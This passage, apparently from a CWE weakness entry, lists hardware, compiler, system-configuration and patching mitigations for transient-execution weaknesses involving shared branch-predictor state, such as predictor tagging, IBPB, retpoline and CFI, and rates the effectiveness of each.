					for example, in the kernel.","Phase:  Architecture and DesignThe hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.Phase:  Architecture and DesignHardware designers may choose to use microarchitectural bits to tag predictor entries. For example, each predictor entry may be tagged with a kernel-mode bit which, when set, indicates that the predictor entry was created in kernel mode. The processor can use this bit to enforce that predictions in the current mode must have been trained in the current mode. This can prevent malicious cross-mode training, such as when user-mode software attempts to create predictor entries that influence transient execution in the kernel. Predictor entry tags can also be used to associate each predictor entry with the SMT thread that created it, and thus the processor can enforce that each predictor entry can only be used by the SMT thread that created it. This can prevent an SMT thread from using predictor entries crafted by a malicious sibling SMT thread.Effectiveness: ModerateNote:Tagging can be highly effective for predictor
					state that is comprised of discrete elements, such as an array of
					recently visited branch targets. Predictor state can also have
					different representations that are not conducive to tagging. For
					example, some processors keep a compressed digest of branch history
					which does not contain discrete elements that can be individually
					tagged.Phase:  Architecture and DesignHardware designers may choose to sanitize microarchitectural predictor state (for example, branch prediction history) when the processor transitions to a different context, for example, whenever a system call is invoked. Alternatively, the hardware may expose instruction(s) that allow software to sanitize predictor state according to the user's threat model. For example, this can allow operating system software to sanitize predictor state when performing a context switch from one process to another.Effectiveness: ModerateNote:This technique may not be able to mitigate
					weaknesses that arise from predictor state that is shared across SMT
					threads. Sanitizing predictor state on context switches may also
					negatively impact performance, either by removing predictor entries
					that could be reused when returning to the previous context, or by
					slowing down the context switch itself.Phase:  ImplementationSystem software can mitigate this weakness by invoking predictor-state-sanitizing operations (for example, the indirect branch prediction barrier on Intel x86) when switching from one context to another, according to the hardware vendor's recommendations.Effectiveness: ModerateNote:This technique may not be able to mitigate
					weaknesses that arise from predictor state shared across SMT
					threads. Sanitizing predictor state may also negatively impact
					performance in some circumstances.Phase:  Build and CompilationIf the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated. One prominent example of this mitigation is retpoline ([REF-1414]).Effectiveness: LimitedNote:This technique is only effective for software
					that is compiled with this mitigation. Additionally, an alternate
					instruction sequence may mitigate the weakness on some processors but
					not others, even when the processors share the same ISA. For example,
					retpoline has been documented as effective on some x86 processors, but
					not fully effective on other x86 processors.Phase:  Build and CompilationUse control-flow integrity (CFI) techniques to constrain the behavior of instructions that redirect the instruction pointer, such as indirect branch instructions.Effectiveness: ModerateNote:Some CFI techniques may not be able to constrain transient execution, even though they are effective at constraining architectural execution. Or they may be able to provide some additional protection against a transient execution weakness, but without comprehensively mitigating the weakness. For example, Clang-CFI provides strong architectural CFI properties and can make some transient execution weaknesses more difficult to exploit [REF-1398].Phase:  Build and CompilationUse software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.Effectiveness: IncidentalNote:Some transient execution weaknesses can be exploited even if a single instruction is executed transiently after a processor event or mis-prediction. This mitigation strategy has many other pitfalls that prevent it from eliminating this weakness entirely. For example, see [REF-1389].Phase:  System ConfigurationSome systems may allow the user to disable predictor sharing. For example, this could be a BIOS configuration, or a model-specific register (MSR) that can be configured by the operating system or virtual machine monitor.Effectiveness: ModerateNote:Disabling predictor sharing can negatively impact
					performance for some workloads that benefit from shared predictor
					state.Phase:  Patching and MaintenanceThe hardware vendor may provide a patch to, for example, sanitize predictor state when the processor transitions to a different context, or to prevent predictor entries from being shared across SMT threads. A patch may also introduce new ISA that allows software to toggle a mitigation.Effectiveness: ModerateNote:This mitigation may only be fully effective if
					the patch prevents predictor sharing across all contexts that are
					affected by the weakness. Additionally, sanitizing predictor state
					and/or preventing shared predictor state can negatively impact
					performance in some circumstances.Phase:  DocumentationIf a hardware feature can allow microarchitectural predictor state to be shared between contexts, SMT threads, or other architecturally defined boundaries, the hardware designer may opt to disclose this behavior in architecture documentation. This documentation can inform users about potential consequences and effective mitigations.Effectiveness: HighPhase:  RequirementsProcessor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels."